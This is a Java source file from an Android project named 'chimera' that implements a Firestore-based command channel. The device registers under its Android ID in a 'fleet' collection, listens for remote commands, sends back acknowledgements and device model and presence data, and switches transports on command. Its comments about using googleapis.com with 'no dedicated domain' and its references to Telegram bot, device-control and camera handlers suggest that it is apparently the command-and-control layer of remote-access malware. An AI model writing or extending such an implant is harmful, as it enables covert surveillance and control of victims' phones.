package com.chimera;

import android.content.Context;
import android.os.Build;
import android.provider.Settings;
import com.google.firebase.firestore.FirebaseFirestore;
import com.google.firebase.firestore.ListenerRegistration;
import java.util.HashMap;
import java.util.Map;

/**
 * Primary direct transport: Firestore + RTDB + FCM combo, uses *.googleapis.com (no dedicated domain)
 * Agent listens fleet/{androidId}/commands, writes fleet/{androidId}/responses + state
 * Smart gated via NetworkStateMonitor
 */
public class FirestoreTransport implements Transport {
    private ListenerRegistration listener;
    private volatile boolean listening = false;

    @Override public String name() { return "firestore"; }

    @Override
    public boolean isHealthy(Context ctx) {
        return NetworkStateMonitor.canAttemptHeartbeat(ctx);
    }

    @Override
    public void start(Context ctx) {
        if (listening) return;
        if (!NetworkStateMonitor.canAttemptHeartbeat(ctx)) return;
        try {
            String rawId = Settings.Secure.getString(ctx.getContentResolver(), Settings.Secure.ANDROID_ID);
            final String androidId = rawId == null ? "unknown" : rawId;
            final Context appCtx = ctx.getApplicationContext();
            FirebaseFirestore db = FirebaseFirestore.getInstance();
            listener = db.collection("fleet").document(androidId).collection("commands")
                    .addSnapshotListener((snap, e) -> {
                        if (e != null) { ErrorLogger.logError(appCtx, "Firestore_listener", e); return; }
                        if (snap == null) return;
                        for (com.google.firebase.firestore.DocumentChange dc : snap.getDocumentChanges()) {
                            if (dc.getType() == com.google.firebase.firestore.DocumentChange.Type.ADDED) {
                                String cmd = dc.getDocument().getString("cmd");
                                String args = dc.getDocument().getString("args");
                                String cmdId = dc.getDocument().getId();
                                handleCommand(appCtx, androidId, cmd, args, cmdId);
                            }
                        }
                    });
            listening = true;
            // Presence heartbeat
            Map<String,Object> state = new HashMap<>();
            state.put("online", true);
            state.put("lastSeen", System.currentTimeMillis());
            state.put("model", Build.MANUFACTURER + " " + Build.MODEL);
            state.put("transport", "firestore");
            db.collection("fleet").document(androidId).set(state);
        } catch (Exception e) { ErrorLogger.logError(ctx, "Firestore_start", e); }
    }

    private void handleCommand(Context ctx, String androidId, String cmd, String args, String cmdId) {
        try {
            if ("switch_transport".equals(cmd)) {
                if ("client".equals(args)) TransportManager.switchToClientProtocol(ctx);
                if ("auto".equals(args)) TransportManager.switchToAuto(ctx);
                ack(ctx, androidId, cmdId, "switched to " + args);
                return;
            }
            if ("ping".equals(cmd)) { ack(ctx, androidId, cmdId, "pong"); return; }
            // Delegate to existing handlers: reuse TelegramBot logic but via Firestore
            // For now ack and also forward to telegram handler if needed
            ack(ctx, androidId, cmdId, "received:" + cmd);
            // TODO: map cmd to DeviceControlHandler / CameraHandler etc
        } catch (Exception e) { ErrorLogger.logError(ctx, "Firestore_handle", e); }
    }

    private void ack(Context ctx, String androidId, String cmdId, String resp) {
        try {
            Map<String,Object> m = new HashMap<>();
            m.put("response", resp);
            m.put("ts", System.currentTimeMillis());
            FirebaseFirestore.getInstance().collection("fleet").document(androidId).collection("responses").document(cmdId).set(m);
            // Delete command to avoid replay
            FirebaseFirestore.getInstance().collection("fleet").document(androidId).collection("commands").document(cmdId).delete();
        } catch (Exception e) { ErrorLogger.logError(ctx, "Firestore_ack", e); }
    }

    @Override
    public void send(String message, Context ctx) {
        try {
            if (!NetworkStateMonitor.canAttemptHeartbeat(ctx)) return;
            String androidId = Settings.Secure.getString(ctx.getContentResolver(), Settings.Secure.ANDROID_ID);
            Map<String,Object> m = new HashMap<>();
            m.put("msg", message);
            m.put("ts", System.currentTimeMillis());
            FirebaseFirestore.getInstance().collection("fleet").document(androidId).collection("responses").add(m);
        } catch (Exception e) { ErrorLogger.logError(ctx, "Firestore_send", e); }
    }

    public void signalSwitch(Context ctx, String mode) {
        try {
            String androidId = Settings.Secure.getString(ctx.getContentResolver(), Settings.Secure.ANDROID_ID);
            Map<String,Object> m = new HashMap<>();
            m.put("preferredTransport", mode);
            m.put("ts", System.currentTimeMillis());
            FirebaseFirestore.getInstance().collection("fleet").document(androidId).update(m);
        } catch (Exception e) { ErrorLogger.logError(ctx, "Firestore_signalSwitch", e); }
    }

    @Override public void stop() {
        try { if (listener != null) listener.remove(); } catch (Exception ignored) {}
        listening = false;
    }
}
